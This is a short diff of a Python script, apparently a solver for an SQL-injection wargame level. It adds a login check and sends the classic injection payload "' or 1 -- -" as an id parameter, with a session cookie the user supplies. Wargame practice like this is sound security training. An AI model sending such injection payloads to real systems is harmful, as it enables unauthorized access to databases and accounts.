@@ -25,6 +25,10 @@ def main():
         cook = {'PHPSESSID': getpass(
             prompt='enter PHPSESSID cookie: ')}
 
+    if "location.href='../';" in los.get_request(url, {}, cook, print_param=False):
+        print('you need to login in browser')
+        exit(1)
+
     param = dict(id="' or 1 -- -")
 
     response = los.get_request(url, param, cook)
